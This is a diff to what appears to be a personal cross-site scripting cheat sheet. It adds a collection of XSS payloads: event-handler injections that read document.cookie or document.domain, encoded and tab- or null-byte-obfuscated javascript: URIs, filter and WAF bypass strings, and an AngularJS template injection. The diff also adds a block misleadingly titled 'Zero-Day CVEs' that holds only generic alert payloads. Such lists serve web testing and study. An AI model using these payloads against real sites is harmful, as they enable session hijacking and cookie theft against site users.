@@ -2,6 +2,8 @@
 
 Cheat Sheet : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
+https://aem1k.com/aurebesh.js/#
+
 "sink" refers to a point in the code where user-controlled data is incorporated into the web page's HTML or JavaScript
 
 #### Methods
@@ -23,6 +25,7 @@ SVG
 
 #### Payloads
 
+`confirm?.(1)`
 
 `<script>alert(1)</script>`
 
@@ -41,6 +44,10 @@ SVG
 `javascript:alert(1)`
 
 `'-alert(1)-'`
+
+`1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=`
+
+`mllamazares%22%20accesskey=%22X%22%20onclick=%22alert(document.domain)%22/%3EPress%20Alt%2BShift%2BX%20to%20continue%20` Alt + shift + X
 
 `<img%20src=1%20onerror=alert(1)>`
 
@@ -184,6 +191,12 @@ WAF Bypass
 `+%22+onmouseover=%22alert(document.cookie)%22%3E%3C!--`
 
 `<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>`
+
+`mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E`
+
+`%3C/script%20%3E`
+
+`<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t​:console.log(1337)">XSS</a>`
 
 https://github.com/freelancermijan/my-payloads/blob/main/XSS/xss-collected.txt
 
@@ -353,3 +366,13 @@ fetch('url', {
 });
 ```
 
+Zero-Day CVEs
+
+```
+1. '"><svg><animate onbegin​=alert('hacked') attributeName=x></svg>  
+2. <a href=javascript​:alert('hacked')>Click Here</a>  
+3. <IFRAME SRC="javascript​:alert('hacked');"></IFRAME>  
+4.<div ng-app> <strong class="ng-init:constructor.constructor('alert('hacked')')()">aaa</strong> </div>  
+5.<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`hacked` //
+```
+![](Pasted%20image%2020240630222052.png)
